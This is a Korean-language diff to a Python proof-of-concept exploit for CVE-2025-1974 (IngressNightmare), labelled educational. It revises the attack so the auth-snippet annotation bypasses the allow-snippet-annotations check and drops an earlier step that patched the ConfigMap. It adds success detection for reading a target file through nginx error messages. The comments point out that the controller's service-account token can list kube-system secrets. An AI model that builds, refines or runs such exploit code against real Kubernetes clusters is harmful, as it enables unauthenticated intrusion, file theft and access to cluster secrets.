@@ -11,9 +11,8 @@ CVE-2025-1974 (IngressNightmare) — 교육용 PoC
 
 중요 전제 조건:
   - ingress-nginx controller < 1.11.5 또는 < 1.12.1
-  - ConfigMap에 allow-snippet-annotations=true (기존 클러스터 기본값)
-    ※ Helm chart 4.9+ 부터는 기본값이 false로 변경됨
   - 클러스터 내 임의 파드에서 admission webhook 서비스 접근 가능
+  ※ allow-snippet-annotations 값 무관: auth-snippet은 이 검사를 우회한다 (취약점 핵심)
 
 공격 흐름:
   1. admission webhook에 AdmissionReview 요청 전송 (인증 불필요)
@@ -25,7 +24,7 @@ CVE-2025-1974 (IngressNightmare) — 교육용 PoC
 실험에서 관찰된 결과 (2026-04-09):
   ✅ Step 1: webhook 인증 없이 접근 가능
   ✅ Step 2: configuration-snippet → allow-snippet-annotations=false로 차단됨
-  ✅ Step 3: auth-snippet → allow-snippet-annotations=true 시 차단 없이 수용
+  ✅ Step 3: auth-snippet → allow-snippet-annotations 검사 우회 (CVE 핵심)
              nginx가 include 대상 파일을 실제로 열어 파싱 시도 (에러에 파일 경로 포함)
              컨트롤러 SA 토큰은 kube-system secrets list 권한 보유
 
@@ -236,12 +235,11 @@ def step2_snippet_blocked(target: str, ca_path: str):
 # ── Step 3: auth-snippet 우회 + 파일 탈취 ─────────────────────────────────────
 
 def step3_auth_snippet_bypass(target: str, ca_path: str, target_file: str):
-    banner("Step 3 — auth-snippet 우회: allow-snippet-annotations=true 클러스터 대상")
+    banner("Step 3 — auth-snippet 우회 (CVE-2025-1974 핵심)")
 
-    info("전제: ConfigMap allow-snippet-annotations=true (기존 클러스터 기본값)")
-    info("      현재 클러스터가 false면 먼저 활성화: ")
-    info("      kubectl patch cm ingress-nginx-controller -n ingress-nginx")
-    info("        --type=merge -p '{\"data\":{\"allow-snippet-annotations\":\"true\"}}'")
+    info("전제: allow-snippet-annotations=false (기본값) — ConfigMap 패치 없음")
+    info("우회: auth-snippet 어노테이션은 allow-snippet-annotations 검사 대상에서 제외됨")
+    info("      (ingress-nginx < 1.11.5 / < 1.12.1 의 취약점)")
     print()
     info("원리: auth-snippet은 ExternalAuth 모듈에서 처리되며,")
     info("      nginx.conf 생성 시 allow-snippet-annotations 검사 없이 값이 삽입됨.")
@@ -273,7 +271,10 @@ def step3_auth_snippet_bypass(target: str, ca_path: str, target_file: str):
 
     print()
     if allowed is False and msg:
-        ok("auth-snippet → webhook이 요청을 처리함 (차단되지 않음 = 우회 성공)")
+        if target_file in msg:
+            ok("auth-snippet → nginx가 파일에 접근함 (allow=false 우회 성공!)")
+        else:
+            ok("auth-snippet → webhook이 요청을 처리함 (차단되지 않음 = 우회 성공)")
         print()
 
         # 에러 메시지에서 파일 내용 추출 시도
